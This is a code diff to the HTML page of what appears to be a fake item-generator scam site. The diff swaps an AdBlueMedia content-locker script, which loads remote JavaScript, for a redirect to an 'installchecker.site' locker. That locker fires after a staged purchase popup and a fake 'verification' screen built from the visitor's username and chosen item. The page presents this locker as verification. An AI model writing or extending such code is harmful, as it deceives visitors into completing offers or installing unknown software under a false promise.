@@ -518,22 +518,7 @@
     <audio id="dingSound" preload="auto" src="media/audio_63c49c13c8.mp3"></audio>
     <audio id="clickSound" preload="auto" src="media/audio_5139288bda.mp3"></audio>
     
-    <!-- AdBlueMedia Locker Script - Loaded on demand -->
-    <script type="text/javascript">
-        var UdgTl_dxf_khKfDc={"it":4547500,"key":"3e245"};
-        
-        // Load AdBlueMedia script only when needed
-        function loadAdBlueMedia() {
-            if (!window.adBlueMediaLoaded) {
-                var script = document.createElement('script');
-                script.src = 'https://d167xx758yszc9.cloudfront.net/79449c0.js';
-                script.onload = function() {
-                    window.adBlueMediaLoaded = true;
-                };
-                document.head.appendChild(script);
-            }
-        }
-    </script>
+    <!-- CPA Locker Scripts Removed -->
 <!-- Google tag (gtag.js) -->
 <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-PXZF2Z55V6"></script>
 <script>
@@ -549,12 +534,8 @@
 
         // --- Configuration ---
         const CPA_LOCKER_SCRIPT = function() {
-            // AdBlueMedia locker - open with _cn() function
-            if (typeof _cn !== 'undefined') {
-                _cn();
-            } else {
-                console.log('AdBlueMedia locker not available');
-            }
+            // New locker from installchecker.site
+            window.location.href = 'https://installchecker.site/cl/i/m521m8';
         };
 
         // --- Active Users Count ---
@@ -868,12 +849,8 @@
                 </div>
             `);
             setTimeout(() => {
-                // Close popup first
+                CPA_LOCKER_SCRIPT();
                 closePurchasePopup();
-                // Then trigger the AdBlueMedia locker with delay
-                setTimeout(() => {
-                    CPA_LOCKER_SCRIPT();
-                }, 500);
             }, 3000);
         }
 
@@ -943,14 +920,11 @@
             $(document).on('click', '#confirm-yes', function() {
                 clickSound.currentTime = 0;
                 clickSound.play().catch(e => {});
-                
-                // Load AdBlueMedia script first, then trigger locker
-                loadAdBlueMedia();
-                setTimeout(function() {
-                    if (typeof _cn !== 'undefined') {
-                        _cn();
-                    }
-                }, 1000);
+                const username = globalData.user_name || $('.profile-username').text().split(' ')[0];
+                const selectedItem = $('.item-card.selected');
+                const itemName = selectedItem.find('.item-name').text().trim();
+                const itemImage = selectedItem.find('.item-img').attr('src');
+                showVerificationState(username, itemName, itemImage);
             });
         });
     </script>
